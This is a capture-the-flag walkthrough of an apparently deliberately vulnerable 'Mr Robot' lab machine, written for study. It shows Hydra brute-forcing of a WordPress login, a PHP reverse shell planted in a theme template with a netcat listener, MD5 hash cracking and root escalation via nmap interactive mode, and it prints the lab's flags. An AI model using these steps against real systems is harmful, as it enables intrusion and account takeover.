### nmap
```bash
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).
```
### key-1
Robots.txt
`<IP>/robots.txt`
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```
Upon navigating to `http://10.10.225.163/key-1-of-3.txt`

Flag: 073403c8a58a1f80d943455fb30724b9

### Download `.dic` file
`http://<IP>/fsocity.dic`

### Directory Busting

```bash
└─$ gobuster dir -u http://10.10.225.163 -w /usr/share/wordlists/dirb/common.txt

/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/0                    (Status: 301) [Size: 0] [--> http://10.10.225.163/0/]
/admin                (Status: 301) [Size: 235] [--> http://10.10.225.163/admin/]

------------------------------SNIP----------------------------------

/wp-admin             (Status: 301) [Size: 238] [--> http://10.10.225.163/wp-admin/]
/wp-content           (Status: 301) [Size: 240] [--> http://10.10.225.163/wp-content/]
/wp-config            (Status: 200) [Size: 0]
/wp-cron              (Status: 200) [Size: 0]
/wp-includes          (Status: 301) [Size: 241] [--> http://10.10.225.163/wp-includes/]
/wp-load              (Status: 200) [Size: 0]
/wp-links-opml        (Status: 200) [Size: 227]
/wp-login             (Status: 200) [Size: 2613]
/wp-mail              (Status: 500) [Size: 3064]
/wp-settings          (Status: 500) [Size: 0]
/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.225.163/wp-login.php?action=register]
/xmlrpc               (Status: 405) [Size: 42]
/xmlrpc.php           (Status: 405) [Size: 42]
```

Navigate to `wp-login` and intercept the request to the Burp suite.
Run `Hydra` against the `fsocity.dic` file to find valid users.
```bash
└─$ hydra -L fsocity.dic -p test <IP> http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:F=Invalid username"

login: Elliot   password: test
```
Do the same now and replace the `.doc` file in the password parameter.
```bash
 hydra -l Elliot -P fsocity.dic <IP> http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:S=302"

 login: Elliot   password: ER28-0652
```
### Login to WP-login

Copy and save the php reverse shell and paste it into the Theme editor's 404 template.

Set up, NetCat listener.

Navigate to the 404 page and get the reverse shell.
`http://<IP>/wp-admin/404.php`

```bash
└─$ rlwrap nc -nvlp 1234
listening on [any] 1234 ...
$ whoami
daemon
```
In Robot's user got a hash.
```bash
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```
Hash cracked successfully: `abcdefghijklmnopqrstuvwxyz`

Switch to the robot using `su -l robot` 

Key2: 822c73956184f694993bede3eb39f959

### Root

Found that `NMAP` is running as root.

Let's interact with nmap and get the shell.

```bash
$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
# cd /root
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
Key3: 04787ddef27c3dee1ee161b21670b4e4
